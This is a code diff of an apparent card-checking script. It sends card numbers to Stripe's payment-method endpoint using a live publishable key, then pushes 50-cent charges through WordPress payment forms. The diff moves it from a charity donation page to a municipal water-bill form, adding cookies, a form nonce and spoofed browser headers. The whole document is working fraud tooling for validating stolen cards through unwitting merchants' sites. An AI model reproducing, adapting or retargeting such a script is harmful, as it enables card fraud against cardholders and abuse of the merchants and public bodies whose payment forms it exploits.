@@ -29,49 +29,54 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&billing_details[name]=JessSmith&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F328730e3ee%3B+stripe-js-v3%2F328730e3ee%3B+card-element&key=pk_live_X8I5Jg4Cf3h2FfLSP7fZ2JwS'
+	data = 'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Feeaff566a9%3B+stripe-js-v3%2Feeaff566a9%3B+card-element&referrer=https%3A%2F%2Fphillipsburgoh.gov&time_on_page=64733&client_attribution_metadata[client_session_id]=1dd5037b-66a7-45fa-857e-e0fb1848d1be&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SCkbd2QFi1R5OccRFBjcVC35jII1s2C2aYbWzuJp5aQreP1hpaa3ZCwNdsANY1YQ9hzF5AUtsD15g8r1Y2nr5DN002qac1owB'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
+	cookies = {
+	    '_ga': 'GA1.1.1526505093.1770008264',
+	    '__stripe_mid': 'e57217d7-7979-44d3-8dce-2b3915e7405659cdc9',
+	    '__stripe_sid': '07e16c0a-c75e-459b-8be9-8306c9b1dfd0d2b8fb',
+	    '_ga_3DSWE1FTZP': 'GS2.1.s1770008264$o1$g0$t1770008271$j53$l0$h0',
+	}
+	
 	headers = {
-	    'Accept': 'application/json, text/javascript, */*; q=0.01',
-	    'Accept-Language': 'en-US,en;q=0.9',
-	    'Connection': 'keep-alive',
-	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'Origin': 'https://www.massairspace.org',
-	    'Referer': 'https://www.massairspace.org/donate/',
-	    'Sec-Fetch-Dest': 'empty',
-	    'Sec-Fetch-Mode': 'cors',
-	    'Sec-Fetch-Site': 'same-origin',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-	    'X-Requested-With': 'XMLHttpRequest',
+	    'authority': 'phillipsburgoh.gov',
+	    'accept': '*/*',
+	    'accept-language': 'en-US,en;q=0.9',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    # 'cookie': '_ga=GA1.1.1526505093.1770008264; __stripe_mid=e57217d7-7979-44d3-8dce-2b3915e7405659cdc9; __stripe_sid=07e16c0a-c75e-459b-8be9-8306c9b1dfd0d2b8fb; _ga_3DSWE1FTZP=GS2.1.s1770008264$o1$g0$t1770008271$j53$l0$h0',
+	    'origin': 'https://phillipsburgoh.gov',
+	    'referer': 'https://phillipsburgoh.gov/water-bill/',
 	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	params = {
+	    't': '1770008329180',
 	}
 	
 	data = {
-	    'action': 'wp_full_stripe_inline_donation_charge',
-	    'wpfs-form-name': 'inline-donations',
-	    'wpfs-form-get-parameters': '%7B%7D',
-	    'wpfs-custom-amount': 'other',
-	    'wpfs-custom-amount-unique': '0.50',
-	    'wpfs-donation-frequency': 'one-time',
-	    'wpfs-billing-name': 'JessSmith',
-	    'wpfs-billing-address-line-1': '27 Allen St',
-	    'wpfs-billing-address-line-2': '',
-	    'wpfs-billing-address-city': 'New York ',
-	    'wpfs-billing-address-state': 'New York ',
-	    'wpfs-billing-address-zip': '10002',
-	    'wpfs-billing-address-country': 'US',
-	    'wpfs-card-holder-email': 'emoji2292299@gmail.com',
-	    'wpfs-card-holder-name': 'JessSmith',
-	    'wpfs-stripe-payment-method-id': f'{pm}',
+	    'data': f'__fluent_form_embded_post_id=3739&_fluentform_10_fluentformnonce=a79e2619a0&_wp_http_referer=%2Fwater-bill%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&input_text=&numeric_field=&phone=&email=&custom-payment-amount=0.5&payment_method=stripe&__stripe_payment_method_id={pm}',
+	    'action': 'fluentform_submit',
+	    'form_id': '10',
 	}
 	
-	response = requests.post('https://www.massairspace.org/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post(
+	    'https://phillipsburgoh.gov/wp-admin/admin-ajax.php',
+	    params=params,
+	    #cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
 	
 	result = response.json()['message']
 	
